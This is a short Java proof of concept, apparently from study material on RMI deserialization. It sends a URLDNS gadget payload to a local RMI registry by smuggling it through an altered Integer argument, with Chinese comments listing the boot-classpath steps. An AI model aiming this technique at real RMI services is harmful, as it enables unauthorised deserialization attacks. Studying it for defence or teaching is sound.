package run.ergou.rmi;

import run.ergou.rmi.interfaces.IUserList;
import run.ergou.rmi.util.CreateURLDNS;

import java.rmi.Naming;
import java.util.HashMap;

public class RMIClientWrapped {
    public static void main(String[] args) throws Exception {

        IUserList userList = (IUserList) Naming.lookup("rmi://localhost:1099/users");

        // 创建反序列化payload对象
        HashMap hashMap = CreateURLDNS.create();

        // 1.执行util.ModifySystemClass方法
        // 2.编译、执行时附加参数 -Xbootclasspath/p:e:/tmp/prependBootstrap
        Integer integer = new Integer("1");
        // 3.取消注释
//        integer.obj = hashMap;
        userList.delUser(integer);

    }
}
